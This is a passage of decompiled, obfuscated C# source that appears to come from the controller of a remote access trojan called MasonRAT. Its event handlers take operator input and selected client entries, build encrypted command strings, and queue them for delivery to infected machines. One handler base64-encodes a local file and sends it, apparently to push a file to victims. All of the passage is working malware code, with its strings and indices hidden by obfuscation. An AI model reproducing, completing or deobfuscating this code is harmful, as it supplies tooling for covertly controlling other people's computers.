        Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
  }

  private void \u2694️MasonRAT\u270Cْڝۏ\u060Cـ؁ــ\u0608ﻻ\u060Bـ(object sender, EventArgs e)
  {
    string str = Interaction.InputBox(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 377), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 378), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 379), (136207143 - 136207156 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) << 0 ^ (99231486 ^ 49615737 << 2075221633) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << -0, (~2004161208 - 181400937 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 >> 0) - (-451663367 - 1743336474 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 + 0 | (1967477525 > 1424547140 ? 899217353 : 1198956470) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 >> 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 << 1));
    Outcoming_Requests outcomingRequests = new Outcoming_Requests(this.\u2694️MasonRAT\u270Cۭڙﻋٻ\u0609اڼۡؤﻋٻۛدﻋـ, Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 380) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ + this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.Text + str));
    Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
  }

  private void \u2694️MasonRAT\u270C\u060Cۡڙڙـا\u060B\u060A\u060Aﮪ\u060D\u0608ـ(
    object sender,
    EventArgs e)
  {
    string str = Interaction.InputBox(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 381), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 382), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 383), (1861758715 ^ 1061016805 % 630624480) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) - 0 - (1362131618 + 572977221 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) + 0 | (1695228092 ^ 5) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 ^ 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << (0 ^ 0), (903845507 + -903845514 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) + 0 ^ (-1459188448 ^ ~1459188441) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) ^ 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 ^ 0));
    Outcoming_Requests outcomingRequests = new Outcoming_Requests(this.\u2694️MasonRAT\u270Cۭڙﻋٻ\u0609اڼۡؤﻋٻۛدﻋـ, Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 384) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ + this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.Text + str));
    Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
  }

  private void \u2694️MasonRAT\u270Cـب̨ـةڙ\u060Aــ\u060Fـ\u060A̍ـټڙ(object sender, EventArgs e)
  {
    try
    {
      foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cڙ\u060B\u060E\u060Fـ\u060Dـــ\u060Fټــــۧۨ.SelectedItems)
      {
        Outcoming_Requests outcomingRequests = new Outcoming_Requests(this.\u2694️MasonRAT\u270Cۭڙﻋٻ\u0609اڼۡؤﻋٻۛدﻋـ, Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 385) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ + this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.Text + selectedItem.Text));
        Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
  }

  private void \u2694️MasonRAT\u270Cڠ؁ـٺـڙمڜ\u060Bـ\u060Fۧٸـۏد\u060Aٸ(object sender, EventArgs e)
  {
    try
    {
      foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cڙ\u060B\u060E\u060Fـ\u060Dـــ\u060Fټــــۧۨ.SelectedItems)
      {
        Outcoming_Requests outcomingRequests = new Outcoming_Requests(this.\u2694️MasonRAT\u270Cۭڙﻋٻ\u0609اڼۡؤﻋٻۛدﻋـ, Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 386) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ + this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.Text + selectedItem.Text));
        Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
  }

  private void \u2694️MasonRAT\u270Cڦـڞ\u060Dــ\u060A\u060Bڼٸ\u060Aڣ\u0609\u060Cـ\u060Cڝ\u060D(
    object sender,
    EventArgs e)
  {
    try
    {
      Outcoming_Requests outcomingRequests = new Outcoming_Requests(this.\u2694️MasonRAT\u270Cۭڙﻋٻ\u0609اڼۡؤﻋٻۛدﻋـ, Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 387) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ + Convert.ToBase64String(File.ReadAllBytes(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 388)))));
      Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      int num = (int) MessageBox.Show(ex.Message);
      ProjectData.ClearProjectError();
    }
  }

  private void \u2694️MasonRAT\u270C\u0609ۡڙټــ\u0020ۛۙۨةـــ(object sender, EventArgs e)
  {
    string str;
    try
    {
      foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cڙ\u060B\u060E\u060Fـ\u060Dـــ\u060Fټــــۧۨ.SelectedItems)
      {
        string[] strArray = new string[((7 ^ 19) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 ^ 0 ^ 1825323480 - 1825323463 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 ^ 0)];
        strArray[0] = str;
        strArray[1] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 389);
        strArray[2146828093 - (1983366081 << 710826301) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 + 0 - ((-983237064 ^ 1781355734 << 1626483838) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) ^ 0 | (834189914 | 220281234) - 503872671 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << (0 ^ 0)] = this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.Text;
        strArray[((-389686651 ^ 1575402847 << 983682791) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) << 0) - (-1384690712 - (1024005723 | 788554119) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) << 0 >> ((422406722 ^ 549221850 << 2143260783) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) ^ 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> -0] = selectedItem.Text;
        strArray[(-1623511592 - -1669567020 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) ^ 0) - ((723523041 ^ 23) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) >> 0 << (1123315065 ^ 20) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 + 0)] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 390);
        str = string.Concat(strArray);
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
    string[] strArray1 = new string[(2144463593 ^ 2076646939 << 543017144) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) + 0 - (532039555 + 1159439198 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) ^ 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 << 1)];
    strArray1[0] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 391);
    strArray1[1] = Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ;
    strArray1[702586924 + 1041707297 % 2003192337 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) + 0 - ((1744294234 ^ 17) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) >> 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> -0] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 392);
    strArray1[478155424 - 1672171675 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) - 0 + (2087813343 - 893797089 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - -0] = this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.Text;
    strArray1[(-976320173 - 1839716985 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) << 0 > (1967246603 + ~987138577 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) ^ 0) ? (2683067 ^ 1373732851 >> 1106069833) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) >> 0 : (1738449184 > 920961583 ? 5 : 6) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + -0] = this.\u2694️MasonRAT\u270Cڙ\u060B\u060E\u060Fـ\u060Dـــ\u060Fټــــۧۨ.FocusedItem.Text;
    strArray1[(1947380129 - 1947379989 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) << 0) - (284138892 - (1715911609 >> 989789083) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) - 0 >> (1512657136 + (1011363490 >> 1419255083) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) >> 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0 << 1] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 393);
    strArray1[(128121098 - (832552181 >> 1322376829) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 >> 0) - ((997602791 ^ 1355329718 << 922631958) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) - 0) % ((1839619262 | 1950539584) - 1983725964 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 << 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 + 0)] = str;
    strArray1[(-1560139048 - -1560139056 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) + 0 ^ 151881203 - 151881188 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - -0] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 394);
    Outcoming_Requests outcomingRequests = new Outcoming_Requests(this.\u2694️MasonRAT\u270Cۭڙﻋٻ\u0609اڼۡؤﻋٻۛدﻋـ, Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(string.Concat(strArray1)));
    Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
  }

  private void \u2694️MasonRAT\u270Cبۡ\u060Bـڙـڇ\u0608\u060D\u060D(object sender, EventArgs e)
  {
    try
    {
      foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cڙ\u060B\u060E\u060Fـ\u060Dـــ\u060Fټــــۧۨ.SelectedItems)
      {
